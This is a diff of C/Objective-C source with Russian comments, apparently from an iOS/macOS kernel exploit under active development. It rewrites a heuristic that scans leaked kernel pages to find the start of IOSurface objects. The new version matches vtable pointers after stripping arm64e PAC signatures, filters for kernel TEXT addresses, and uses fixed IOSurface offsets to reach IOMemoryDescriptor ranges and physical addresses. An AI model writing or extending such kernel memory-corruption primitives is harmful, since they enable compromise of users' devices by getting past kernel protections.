@@ -5787,23 +5787,34 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t paLo = kconstant(physBase);
     uint64_t paHi = paLo + kconstant(physSize);
     // 1.9.106: конец скан-эвристикам (кандидаты-константы 0x10122000000).
-    // Якорь старта объекта по VTABLE: у dst и src один класс → одинаковая
-    // vtable; самый ДАЛЬНИЙ общий kernel-ptr позади ID-поля = старт объекта.
-    // Дальше точные XPF-оффсеты: IOSurface.ranges @ +0x360 (→ IOMemoryDescriptor),
-    // rangeCount @ +0x3a4 (==1 для одностраничной 32x32 BGRA).
+    // Якорь старта объекта по VTABLE: у dst и src один класс → одна vtable.
+    // 1.9.107: vtable на arm64e PAC-подписана солью=адрес объекта — сырые
+    // значения РАЗНЫЕ (видели в дампе M2-клиента: одна цель, семь солей).
+    // Сравниваем UNTAGGED и требуем kernel TEXT (top32 == 0xfffffff0):
+    // heap-указатели (0xffffffeX) и PA-константы (0x000001xx) отмирают.
     uint64_t objStartD = 0, objStartS = 0;
     for (uint32_t back = 8; back <= 0x400 && back <= idOffD && back <= idOffS; back += 8) {
         uint64_t vd = 0, vs = 0;
         memcpy(&vd, pgD + idOffD - back, 8);
         memcpy(&vs, pgS + idOffS - back, 8);
-        if (vd != vs) continue;
-        if (!kpLooksLikeKernelPointer(kp_untag_ptr(vd))) continue;
+        uint64_t ud = kp_untag_ptr(vd), us = kp_untag_ptr(vs);
+        if (ud != us) continue;
+        if ((ud >> 32) != 0xfffffff0ULL) continue;
         objStartD = surfObjVA - back;   // последний матч = самый дальний
         objStartS = srcObjVA - back;
     }
     kpNote(r, [NSString stringWithFormat:@"  vtable-якорь: старт dst @ %#llx, src @ %#llx %@",
               (unsigned long long)objStartD, (unsigned long long)objStartS,
-              objStartD ? @"" : @"— НЕ НАЙДЕН (это не IOSurface-объекты?)"]);
+              objStartD ? @"" : @"— НЕ НАЙДЕН (дамп позади ID ниже)"]);
+    if (!objStartD) {
+        for (uint32_t back = 8; back <= 0x40 && back <= idOffD && back <= idOffS; back += 8) {
+            uint64_t vd = 0, vs = 0;
+            memcpy(&vd, pgD + idOffD - back, 8);
+            memcpy(&vs, pgS + idOffS - back, 8);
+            kpNote(r, [NSString stringWithFormat:@"    ID-%#02x: dst=%#018llx src=%#018llx", back,
+                      (unsigned long long)vd, (unsigned long long)vs]);
+        }
+    }
 
     uint64_t candVA[16], candPA[16];
     int candN = 0;
